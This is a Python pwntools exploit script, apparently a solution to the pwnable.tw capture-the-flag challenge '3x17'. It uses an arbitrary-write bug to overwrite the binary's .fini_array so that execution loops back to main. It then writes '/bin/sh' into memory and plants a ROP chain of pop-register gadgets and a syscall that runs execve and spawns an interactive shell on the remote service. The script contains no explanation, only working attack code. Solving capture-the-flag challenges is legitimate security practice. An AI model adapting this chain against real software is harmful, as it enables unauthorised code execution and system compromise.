from pwn import *

context(os="linux", arch="amd64", log_level="debug")
ready = True

elf = ELF("./3x17")
if ready:
    io = remote("chall.pwnable.tw", 10105)
    context.log_level = "INFO"
else:
    io = process("./3x17")

def wrt(addr, content):
    io.recvuntil("addr:")
    io.sendline(str(addr))
    io.recvuntil("data:")
    io.send(content)
    sleep(0.1)

main_addr = 0x401B6D
content = p64(0x402960) + p64(main_addr)
wrt(0x4B40F0, content)

"""
sys_execve("/bin/sh\0", 0, 0)
rax = 0x3B
rdi = 0x4B9460
rsi = 0
rdx = 0

0x0000000000401c4b : leave ; ret
0x000000000041e4af : pop rax ; ret

0x0000000000401696 : pop rdi ; ret
0x0000000000406c30 : pop rsi ; ret
0x0000000000446e35 : pop rdx ; ret
0x00000000004022b4 : syscall
"""

wrt(0x4B9460, "/bin/sh\0")
wrt(0x4B4100, p64(0x3B)     + p64(0x401696))
wrt(0x4B4110, p64(0x4B9460) + p64(0x406c30))
wrt(0x4B4120, p64(0)        + p64(0x446e35))
wrt(0x4B4130, p64(0)        + p64(0x4022b4))

wrt(0x4B40F0, p64(0x401C4B) + p64(0x41E4AF))

io.interactive()